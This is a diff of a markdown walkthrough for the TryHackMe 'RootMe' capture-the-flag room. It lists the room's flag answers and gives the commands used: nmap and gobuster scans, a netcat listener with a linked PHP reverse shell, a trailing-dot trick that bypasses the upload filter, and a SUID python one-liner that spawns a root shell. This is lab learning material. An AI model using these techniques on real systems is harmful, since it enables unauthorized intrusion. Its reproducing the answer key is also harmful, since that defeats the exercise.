@@ -1,126 +1,119 @@
-# RootMe
+# RootMe 🏴‍☠️
 
 **Date:** 09.02.2025  
 **Difficulty:** Easy
 
 ---
-
 ## Questions and Answers ✅
 
-1. Scan the machine, how many ports are open?
-`2`
-2. What version of Apache is running?
-`2.4.29`
-3. What service is running on port 22?
-`ssh`
-4. What is the hidden directory?
-`/panel/`
-5. user.txt (flag)?
-`THM{y0u_g0t_a_sh3ll}`
-6. Search for files with SUID permission, which file is weird?
-`/usr/bin/python`
-7. root.txt (flag)?
-`THM{pr1v1l3g3_3sc4l4t10n}`
----
+1. **Scan the machine, how many ports are open?**  
+   `2`
+2. **What version of Apache is running?**  
+   `2.4.29`
+3. **What service is running on port 22?**  
+   `ssh`
+4. **What is the hidden directory?**  
+   `/panel/`
+5. **user.txt (flag)?**  
+   `THM{y0u_g0t_a_sh3ll}`
+6. **Search for files with SUID permission, which file is unusual?**  
+   `/usr/bin/python`
+7. **root.txt (flag)?**  
+   `THM{pr1v1l3g3_3sc4l4t10n}`
 
+---
 ## Obtained Information 🔍
 
 - **Target IP Address:** `<IP_ADDRESS>`
-- open ports: 22 | 80
-- website lets unverified file upload and we can access uploaded files
-- 
+- **Open ports:** `22` (SSH), `80` (HTTP)
+- **Website allows unauthenticated file uploads**, and uploaded files can be accessed.
 
 ---
-
 ## Process 🕵️‍♂️
 
-1. Using nmap to scan open ports:
+### **1. Scanning the machine with Nmap**
 ```bash
 nmap -sV -sS <IP_ADDRESS>
 ```
-
-*Results*
+**Results:**
 ```bash
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
 80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
 ```
+This answers three questions at once!
 
-So we have found answers for 3 questions at once!
-
-2. Using gobuster to get hidden directory:
+### **2. Discovering hidden directories with Gobuster**
 ```bash
-gobuster dir -u "http://<IP_ADDRESS>" -w ./Desktop/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt -r -x .js,.php
+gobuster dir -u "http://<IP_ADDRESS>" -w ./Tools/wordlists/dirbuster/directory-list-2.3-medium.txt -r -x .js,.php
 ```
-
-*Results*
+**Results:**
 ```bash
-/index.php            (Status: 200) [Size: 616]
-/.php                 (Status: 403) [Size: 278]
-/uploads              (Status: 200) [Size: 744]
-/css                  (Status: 200) [Size: 1126]
-/js                   (Status: 200) [Size: 959]
-/panel                (Status: 200) [Size: 732]
-/server-status        (Status: 403) [Size: 278]
+/index.php            (Status: 200)
+/.php                 (Status: 403)
+/uploads              (Status: 200)
+/css                  (Status: 200)
+/js                   (Status: 200)
+/panel                (Status: 200) ✅
+/server-status        (Status: 403)
 ```
+We found `/panel/` as the hidden directory!
 
-Another question answered!
-
-3. Exploiting unauthorized files upload available on web server by setting up listening on port 1234 for incoming connections:
+### **3. Exploiting Unauthenticated File Upload**
+Since the web server allows file uploads, we set up a listener for incoming connections:
 ```bash
 nc -vnlp 1234
 ```
+Then, we upload a **reverse shell script**:
+🔗 [php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
 
-and uploading reverse shell script (after editing line 49 and 50):
-*script:* https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+### **4. Bypassing File Upload Restrictions**
+Uploading a `.php` file directly is blocked. However, adding a dot (`.`) at the end of the filename (`shell.php.`) bypasses this restriction!
 
-4. While trying to upload a file we get an error, saying that we can't upload php files. We can omit that in many ways. I used adding dot (.) at the end of the file name (after extension).
-
-5. Now we got control over target system. Running 
+### **5. Getting a Shell and Finding the First Flag**
+Once the reverse shell is active, we locate `user.txt`:
 ```bash
-find . -type f -name "user.txt"
-``` 
-we can find that file in var/www directory and 
-```bash
-cat ./var/www/user.txt
+find / -type f -name "user.txt" 2>/dev/null
+cat /var/www/user.txt
 ```
+✅ First flag obtained!
 
-We got a flag!
-
-6. Next we use command to search through files with SUID permission to say which file is weid:
+### **6. Searching for SUID Files**
+We look for files with the **SUID bit**, which allows privilege escalation:
 ```bash
-find / -user root -perm /4000 | grep -v "Permission"
+find / -user root -perm /4000 2>/dev/null | grep -v "Permission"
 ```
-I wanted to exclude a lot of "Permission denied" files. The answer for the question is /usr/bin/python!
+✅ Unusual file found: `/usr/bin/python`
 
-7. This file is weird, because it is present on *GTFOBins* list, which means we can use this file as vulnerability. One of there is privilege escalation:
-```text
-If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor.
-```
+### **7. Exploiting SUID Python for Privilege Escalation**
+This file is listed on **GTFOBins**, meaning it can be abused to escalate privileges:
+> *If the binary has the SUID bit set, it does not drop elevated privileges and may be abused to access the file system or maintain privileged access as a SUID backdoor.*
 
-So we run found script:
+Running the following command gives us a root shell:
 ```bash
-$ /usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 whoami  
 root
 ```
+✅ We now have root access!
 
-Now we have access to root folder where we should find our second flag and answer to last question.
-
-8. Flag found at root dir.
+### **8. Retrieving the Final Flag**
+With root access, we find `root.txt` in `/root/`:
+```bash
+cat /root/root.txt
+```
+✅ Final flag obtained!
 
 ---
-
 ## Reflection & Questions for Further Research 🤔💡
 
-- Why php script is executed when opened and python or bash scripts are not?
+- Why are PHP scripts executed when accessed, but Python or Bash scripts are not?
 
 ---
-
 ## Summary & Takeaways 📌📖
 
-- learned that we can search for files that needs root permission 
-- What is SUID (/4000)
-- learned about GTFOBins and using binary files to escalate privileges (earlier thought that /bin means some container, like trash bin 🤣)
-
----
+- **Found hidden directories using Gobuster.**
+- **Learned how to bypass file upload restrictions using a trailing dot (`.`).**
+- **Used GTFOBins to exploit SUID binaries for privilege escalation.**
+- **Understood how `/usr/bin/python` can be abused when SUID is set.** (BTW. I thought that bin in directory means trash bin or something 😆)
+- **Realized the importance of checking for SUID binaries in privilege escalation.**
